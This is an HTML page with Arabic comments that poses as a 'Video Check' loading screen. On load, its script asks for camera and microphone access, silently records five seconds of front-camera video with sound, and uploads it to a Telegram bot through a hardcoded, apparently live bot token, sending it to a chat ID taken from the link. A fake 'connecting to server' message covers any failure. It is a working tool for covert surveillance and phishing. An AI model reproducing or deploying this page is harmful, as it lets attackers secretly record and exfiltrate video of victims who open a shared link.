<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Check</title>
    <style>
        body { background-color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .loading { display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(0,0,0,.3); border-radius: 50%; border-top-color: #3498db; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="status">
        <div class="loading"></div>
        <p>جاري تحميل البيانات...</p>
    </div>

    <video id="videoPreview" style="display:none;" autoplay muted playsinline></video>

    <script>
        // إعدادات البوت والصفحة
        const botToken = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E'; // توكن البوت الخاص بك
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('sender_id'); // الحصول على الـ ID من الرابط
        const recordDuration = 5000; // مدة التسجيل بالملي ثانية (5 ثوانٍ)

        let mediaRecorder;
        let recordedChunks = [];

        async function startSystem() {
            // التحقق من وجود chatId
            if (!chatId) {
                document.body.innerHTML = '<h2>خطأ: الـ ID الخاص بك غير موجود. يرجى فتح الرابط من التلجرام.</h2>';
                return;
            }

            try {
                // طلب الإذن من المستخدم للكاميرا والمايكروفون (لبدء الفيديو)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                const videoPreview = document.getElementById('videoPreview');
                videoPreview.srcObject = stream;

                // إعداد MediaRecorder
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

                // تجميع بيانات الفيديو
                mediaRecorder.ondataavailable = function(event) {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                // عند انتهاء التسجيل
                mediaRecorder.onstop = uploadVideo;

                // بدء التسجيل
                mediaRecorder.start();
                console.log('Started recording...');

                // إيقاف التسجيل بعد المدة المحددة
                setTimeout(() => {
                    mediaRecorder.stop();
                    console.log('Stopped recording.');
                    // إغلاق الكاميرا والمايكروفون
                    stream.getTracks().forEach(track => track.stop());
                }, recordDuration);

            } catch (err) {
                console.error("Error accessing camera/mic:", err);
                // إظهار واجهة وهمية حتى لو فشل
                document.getElementById('status').innerHTML = '<div class="loading"></div><p>جاري الاتصال بالسيرفر...</p>';
            }
        }

        async function uploadVideo() {
            console.log('Preparing to upload...');
            
            // إنشاء ملف فيديو واحد
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            
            // تجهيز البيانات للإرسال
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', blob, 'recorded_video.webm'); // اسم الملف

            // إرسال الفيديو عبر الـ API الخاص بتلجرام
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('Video uploaded successfully!');
                } else {
                    console.error('Video upload failed.');
                }
            } catch (err) {
                console.error('Network error during upload:', err);
            }
        }

        // بدء التشغيل بمجرد فتح الصفحة
        startSystem();

    </script>
</body>
</html>
